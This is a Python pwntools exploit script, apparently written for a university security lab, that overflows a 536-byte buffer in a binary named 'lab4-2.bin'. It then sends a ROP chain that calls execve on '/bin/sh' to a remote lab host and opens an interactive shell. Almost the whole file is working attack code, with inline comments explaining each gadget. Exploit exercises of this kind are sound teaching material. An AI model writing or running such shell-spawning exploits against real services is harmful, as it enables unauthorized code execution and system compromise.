from pwn import *

# Set CPU context architecture
context.arch = "amd64"

payload = b""                              # initial payload variable
payload += (b"A"*536)                       # Padding bytes to overflow target buffer up to including RBP
payload += p64(0x453377)                    # pointer addres to ROP gadget "pop rax; ret;" to pop 59 to RAX
payload += p64(59)                          # 59 is the 64 bit sycall number (0x3b)
payload += p64(0x4018a2)                    # pointer addres to ROP gadget "pop rdi; ret;" to pop "/bin/sh" to RDI
payload += p64(0x4c20f0)                    # pointer addres to "/bin/sh", the 1st arguement to sys_execve()
payload += p64(0x4027ca)                    # pointer address to ROP gadget "pop rsi; ret;" to pop 0 to rsi
payload += p64(0)                           # we use 0 (0x0) the 2nd arguement (argv*) of sys_execve() 
payload += p64(0x4017af)                    # pointer address to ROP gadget "pop rdx; ret;" to pop 0 to rdx
payload += p64(0)                           # we use 0 (0x0) the 3rd arguement (envp*) of sys_execve() 
payload += p64(0x401213)                    # sycall to execute the sys_execve() functinon setup in the ROP chain


# Launch exploit process 
#p = gdb.debug("./lab4-2.bin")            # run exploit against binary locally with process attached to gdb
#p = process("./lab4-2.bin")              # run exploit against binary locally without attacking the process to gdb 
p = remote("csc748.hostbin.org", 7042)   # run the exploit against a remote process

# Recive and print output
response = p.recvuntil("Input string: ").decode("utf-8")
print(response)
print("")

# Send payload
p.sendline(payload)

# Switch to interactive
p. interactive()

